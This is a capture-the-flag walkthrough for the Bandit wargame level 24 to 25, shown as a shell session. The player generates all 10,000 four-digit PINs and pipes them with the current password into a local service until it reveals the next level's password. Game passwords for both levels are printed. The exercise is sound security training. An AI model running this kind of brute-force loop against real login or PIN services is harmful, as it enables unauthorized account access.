#Level 24-25
```bash
**bandit24@bandit:~$** nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
Wrong! Please enter the correct current password and pincode. Try again.
^C
**bandit24@bandit:~$** for i in {0000..9999} ; do echo $1; done
**bandit24@bandit:~$** mkdir /tmp/solution
**bandit24@bandit:~$** cd /tmp/solution
**bandit24@bandit:/tmp/solution$** for i in {0000..9999} ; do echo $i >> pin ; done
**bandit24@bandit:/tmp/solution$** cat pin
0000
0001
0002
0003
0004
0005
...
...
...
**bandit24@bandit:/tmp/solution$** cat pin | xargs -I % echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8" %
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0002
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0003
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0004
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0005
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0006
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0007
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0008
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0009
...
...
...
**bandit24@bandit:/tmp/solution$** cat pin | xargs -I % echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8" % | nc localhost 30002 | tee results.txt
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
...
...
...
Wrong! Please enter the correct current password and pincode. Try again.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
